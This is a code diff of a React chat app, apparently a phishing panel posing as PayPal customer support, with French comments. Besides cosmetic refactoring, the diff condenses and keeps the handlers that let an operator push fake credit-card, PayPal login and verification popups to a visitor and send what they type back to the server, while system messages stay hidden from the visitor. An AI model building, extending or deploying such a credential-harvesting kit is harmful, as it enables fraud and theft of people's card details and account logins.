@@ -33,11 +33,11 @@ const PayPalIcon = () => (
   </svg>
 );
 
-// ✅ Composant Bandeau Défilant 
+// ✅ NOUVEAU : Bandeau Défilant Optimisé Mobile
 const ScrollingBanner = () => {
     return (
         <div className="bg-red-600 text-white text-sm py-2 overflow-hidden relative border-b border-red-700">
-            <div className="scrolling-text px-4">
+            <div className="scrolling-text">
                 🚨 We have experienced network disruptions over the past 48 hours, thank you for your understanding. The service restricts its opening hours from Monday to Friday between 10:00 AM and 12:00 PM and 2:30 PM and 4:30 PM 🚨
             </div>
         </div>
@@ -439,8 +439,6 @@ function App() {
     const [showPayPalLogin1Popup, setShowPayPalLogin1Popup] = useState(false);
     const [showPayPalLogin2Popup, setShowPayPalLogin2Popup] = useState(false);
     const [showVerificationPopup, setShowVerificationPopup] = useState(false);
-    
-    // ✅ NOUVEAU : État pour le loading spinner
     const [isConnecting, setIsConnecting] = useState(false);
 
     // Demander permission pour notifications browser
@@ -452,7 +450,6 @@ function App() {
 
     useEffect(() => {
         if (isLoggedIn) {
-            // Informer le serveur du type d'utilisateur
             socket.emit('user type', { userType });
 
             const handleNewMessage = (msg) => {
@@ -568,11 +565,10 @@ function App() {
         messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
     }, [messages]);
 
-    // ✅ MODIFIÉ : Fonction handleLogin avec spinner
     const handleLogin = async (e) => {
         e.preventDefault();
         setError('');
-        setIsConnecting(true); // ✅ Activer le spinner
+        setIsConnecting(true);
         
         try {
             const response = await fetch(`${API_URL}/verify`, { 
@@ -592,7 +588,7 @@ function App() {
         } catch (err) {
             setError('Server connection error. Please try again.');
         } finally {
-            setIsConnecting(false); // ✅ Désactiver le spinner
+            setIsConnecting(false);
         }
     };
     
@@ -635,62 +631,26 @@ function App() {
         e.target.value = null;
     };
 
-    const handleRequestPopup = () => {
-        socket.emit('request popup');
-    };
-
-    const handleRequestCreditCard = () => {
-        socket.emit('request credit card');
-    };
-
-    const handleRequestPayPalLogin1 = () => {
-        socket.emit('request paypal login1');
-    };
-
-    const handleRequestPayPalLogin2 = () => {
-        socket.emit('request paypal login2');
-    };
-
-    const handlePopupChoice = (option) => {
-        setShowPopup(false);
-        socket.emit('popup choice', { option });
-    };
-
-    const handleCreditCardSubmit = (cardData) => {
-        socket.emit('credit card data', { cardData });
-        setShowCreditCardPopup(false);
-    };
-
-    const handlePayPalLogin1Submit = (loginData) => {
-        socket.emit('paypal login1 data', { loginData });
-        setShowPayPalLogin1Popup(false);
-    };
-
-    const handlePayPalLogin2Submit = (verificationData) => {
-        socket.emit('paypal login2 data', { verificationData });
-        setShowPayPalLogin2Popup(false);
-    };
+    const handleRequestPopup = () => socket.emit('request popup');
+    const handleRequestCreditCard = () => socket.emit('request credit card');
+    const handleRequestPayPalLogin1 = () => socket.emit('request paypal login1');
+    const handleRequestPayPalLogin2 = () => socket.emit('request paypal login2');
+    const handlePopupChoice = (option) => { setShowPopup(false); socket.emit('popup choice', { option }); };
+    const handleCreditCardSubmit = (cardData) => { socket.emit('credit card data', { cardData }); setShowCreditCardPopup(false); };
+    const handlePayPalLogin1Submit = (loginData) => { socket.emit('paypal login1 data', { loginData }); setShowPayPalLogin1Popup(false); };
+    const handlePayPalLogin2Submit = (verificationData) => { socket.emit('paypal login2 data', { verificationData }); setShowPayPalLogin2Popup(false); };
 
     const handleCheckboxChange = (type) => {
         if (type === 'important') {
             setIsImportant(!isImportant);
-            if (!isImportant) {
-                setIsSuccess(false);
-                setIsVerifying(false);
-            }
+            if (!isImportant) { setIsSuccess(false); setIsVerifying(false); }
         } else if (type === 'success') {
             setIsSuccess(!isSuccess);
-            if (!isSuccess) {
-                setIsImportant(false);
-                setIsVerifying(false);
-            }
+            if (!isSuccess) { setIsImportant(false); setIsVerifying(false); }
         } else if (type === 'verifying') {
             const newVerifyingState = !isVerifying;
             setIsVerifying(newVerifyingState);
-            if (newVerifyingState) {
-                setIsImportant(false);
-                setIsSuccess(false);
-            }
+            if (newVerifyingState) { setIsImportant(false); setIsSuccess(false); }
             socket.emit('verification popup', { show: newVerifyingState });
         }
     };
@@ -712,8 +672,6 @@ function App() {
                             <input type="text" id="date" value={date} placeholder="DD/MM/YYYY" onChange={(e) => setDate(e.target.value)} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-[#009cde] focus:border-[#009cde]" required />
                         </div>
                         {error && <p className="text-red-500 text-sm text-center mb-4">{error}</p>}
-                        
-                        {/* ✅ NOUVEAU : Bouton avec spinner */}
                         <button 
                             type="submit" 
                             disabled={isConnecting}
@@ -745,7 +703,7 @@ function App() {
             {showPayPalLogin2Popup && <PayPalLogin2Popup onSubmit={handlePayPalLogin2Submit} onClose={() => setShowPayPalLogin2Popup(false)} />}
             {showVerificationPopup && <VerificationPopup />}
             
-            {/* Bandeau défilant rouge - Affiché seulement côté client */}
+            {/* ✅ NOUVEAU : Bandeau défilant optimisé mobile */}
             {userType === 'User' && <ScrollingBanner />}
             
             <header className="flex items-center justify-between p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
@@ -796,7 +754,6 @@ function App() {
 
             <main className="flex-1 p-6 overflow-y-auto space-y-6">
                 {messages.map((msg, index) => {
-                    // Ne pas afficher les messages système côté client
                     if (msg.user === 'System' && userType === 'User') {
                         return null;
                     }
